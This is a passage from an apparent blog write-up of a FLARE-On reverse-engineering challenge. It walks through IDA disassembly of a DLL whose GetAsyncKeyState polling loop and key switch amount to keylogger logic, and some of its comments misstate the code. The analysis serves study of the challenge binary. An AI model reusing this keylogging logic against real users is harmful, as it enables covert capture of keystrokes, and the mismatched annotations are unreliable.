</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A76C</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_114</span>], <span style=color:#b58900>eax</span>   <span style=color:#586e75>; Not used anymore</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A772</span> <span style=color:#268bd2>loc_1000A772</span>:
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A772</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_1000A4C0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A777</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_118</span>], <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A77D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_118</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A783</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A786</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A788</span> <span style=color:#268bd2>call</span>    @<span style=color:#268bd2>__security_check_cookie@4</span> <span style=color:#586e75>; __security_check_cookie(x)</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A78D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esp</span>, <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A78F</span> <span style=color:#268bd2>pop</span>     <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A790</span> <span style=color:#268bd2>retn</span>    <span style=color:#2aa198>0Ch</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A790</span> <span style=color:#268bd2>_DllMain@12</span> <span style=color:#268bd2>endp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A790</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>After we return from <code>sub_1000A610</code>, we land in line 5. Return value will be saved in <code>var_114</code> (0 is key was created). If we highlight this variable and press <code>x</code> in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called <code>sub_1000A4C0</code>. Let's go inside.</p><p><img src=/images/2014/flare/5-4.jpg alt=1000A4C0 title=1000A4C0></p><p>Inside <code>sub_1000A4C0</code> we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let's look at the other branch.</p><figure class=code><figcaption><span>sub_1000A4C0</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4D3</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_rand</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4D8</span> <span style=color:#268bd2>cdq</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4D9</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, <span style=color:#2aa198>0C8h</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4DE</span> <span style=color:#268bd2>idiv</span>    <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4E0</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>edx</span>, <span style=color:#2aa198>32h</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4E3</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_10</span>], <span style=color:#b58900>edx</span>    <span style=color:#586e75>; var_10 = size of array of type size_t</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4E6</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_10</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4E9</span> <span style=color:#268bd2>imul</span>    <span style=color:#b58900>edx</span>, <span style=color:#2aa198>0Fh</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4EC</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>             <span style=color:#586e75>; size_t</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4ED</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_malloc</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4F2</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>4</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4F5</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_C</span>], <span style=color:#b58900>eax</span> <span style=color:#586e75>; pointer to allocated memory</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4F8</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_10</span>]    <span style=color:#586e75>; eax = size of array</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4FB</span> <span style=color:#268bd2>imul</span>    <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0Fh</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4FE</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; size_t</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A4FF</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>0</span>               <span style=color:#586e75>; int</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A501</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_C</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A504</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>             <span style=color:#586e75>; void *</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A505</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_memset</span>         <span style=color:#586e75>; Initialize array with 0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A50A</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>0Ch</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A50D</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>0Ah</span>             <span style=color:#586e75>; dwMilliseconds</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A50F</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>Sleep</span>        <span style=color:#586e75>; Sleep for 10 miliseconds</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A515</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>edx</span>, <span style=color:#b58900>edx</span>        <span style=color:#586e75>; edx = 0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A517</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_8</span>], <span style=color:#b58900>dx</span> <span style=color:#586e75>; var_8 = 0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A51B</span> <span style=color:#268bd2>loc_1000A51B</span>:
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A51B</span> <span style=color:#268bd2>movsx</span>   <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_8</span>]   <span style=color:#586e75>; eax = 0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A51F</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_10</span>]  <span style=color:#586e75>; if (0 =&gt; size of array)</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A522</span> <span style=color:#268bd2>jge</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A554</span> <span style=color:#586e75>; if (no memory was allocated) - jump to loc_1000A554</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; if memory was allocated</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A524</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>0Ah</span>             <span style=color:#586e75>; dwMilliseconds</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A526</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>Sleep</span>        <span style=color:#586e75>; Sleep for 10 miliseconds</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A52C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_10009EB0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A531</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_14</span>], <span style=color:#b58900>eax</span>    <span style=color:#586e75>; var_14 = sub_10009EB0()</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A534</span> <span style=color:#268bd2>cmp</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_14</span>], <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A538</span> <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A55</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Line 1 calls <code>rand</code> and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for <code>malloc</code>. So a random number of bytes are allocated. Seems like it is allocating an array of type <code>size_t</code>. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the <code>malloc</code>, the pointer to the allocated memory is stored in <code>var_C</code>. In lines 13-19 we see that this array is reset to zero by <code>memset</code>. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call <code>sub_10009EB0</code>.</p><figure class=code><figcaption><span>sub_10009EB0</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB0</span> <span style=color:#268bd2>sub_10009EB0</span> <span style=color:#268bd2>proc</span> <span style=color:#268bd2>near</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB0</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB0</span> <span style=color:#268bd2>var_8</span>= <span style=color:#dc322f>dword</span> <span style=color:#268bd2>ptr</span> <span style=color:#719e07>-</span><span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB0</span> <span style=color:#268bd2>var_4</span>= <span style=color:#dc322f>word</span> <span style=color:#268bd2>ptr</span> <span style=color:#719e07>-</span><span style=color:#2aa198>4</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB0</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB0</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB1</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ebp</span>, <span style=color:#b58900>esp</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB3</span> <span style=color:#268bd2>sub</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EB6</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EBB</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>], <span style=color:#b58900>ax</span>   <span style=color:#586e75>; var_4 = 0</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EBF</span> <span style=color:#268bd2>jmp</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_10009ECD</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>ECD</span> <span style=color:#268bd2>loc_10009ECD</span>:
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>ECD</span> <span style=color:#268bd2>movsx</span>   <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>ED1</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>edx</span>, <span style=color:#2aa198>0DEh</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>ED7</span> <span style=color:#268bd2>jg</span>      <span style=color:#268bd2>loc_1000A3A4</span> <span style=color:#586e75>; if var_4 &gt; 222 (0xDE) jump to loc_1000A3A4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EDD</span> <span style=color:#268bd2>movsx</span>   <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EE1</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; vKey</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EE2</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>GetAsyncKeyState</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EE8</span> <span style=color:#268bd2>movsx</span>   <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ax</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EEB</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>ecx</span>, <span style=color:#2aa198>0FFFF8001h</span> <span style=color:#586e75>; check if vKey was pressed</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EF1</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>loc_1000A39F</span>    <span style=color:#586e75>; jumptable 1000A2D4 default case</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A39F</span> <span style=color:#268bd2>loc_1000A39F</span>:           <span style=color:#586e75>; jumptable 1000A2D4 default case</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A39F</span> <span style=color:#268bd2>jmp</span>     <span style=color:#268bd2>loc_10009EC1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EC1</span> <span style=color:#268bd2>loc_10009EC1</span>:
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EC1</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>cx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EC5</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>cx</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>.text:10009<span style=color:#268bd2>EC9</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>], <span style=color:#b58900>cx</span> <span style=color:#586e75>; (var_4)++</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; go back to line 14</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>This is what we are looking for. First <code>var_4</code> is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to <code>loc_1000A3A4</code>.</p><p>If not we will reach line 18 where <code>var_4</code> (initially 0) is stored in eax and pushed to stack as parameter for <code>GetAsyncKeyState</code>. We already know what this function does. If <code>vKey</code> has been pressed since last call to <code>GetAsyncKeyState</code>, it will return a value. Otherwise it will return 0. This <a href="http://reversing.be/forum/viewtopic.php?t=628&amp;sid=bf0d5e83ef43f1c34c41cd5cd2793a76" target=_blank rel="noreferrer noopener">forum thread from 2007</a> discusses this usecase.<br>If the key was not pressed, we jump to line 26 and then 29 where <code>var_4</code> is increased by 1. Then we go back to line 14 where <code>var_4</code> is compared with 222 and the cycle is repeated.</p><p>Now we know that the application loops through ascii characters from 0 to 222 checking to see if a key was pressed. If so we will not jump at line 23 and continue. Let's take a look at that.</p><p><img src=/images/2014/flare/5-5.jpg alt="Key pressed" title="Key pressed"></p><p>This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from <code>0x27</code> to <code>0x60</code>. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for <code>M</code> or <code>0x4D</code> caught my eye. Finding the code for <code>M</code> and clicking on the red arrow besides it.</p><figure class=code><figcaption><span>If M is pressed</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A1B6</span> <span style=color:#268bd2>loc_1000A1B6</span>:
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A1B6</span> <span style=color:#268bd2>movsx</span>   <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A1BA</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>4Dh</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A1BD</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A1C9</span>
</span></span><span style=display:flex><span>
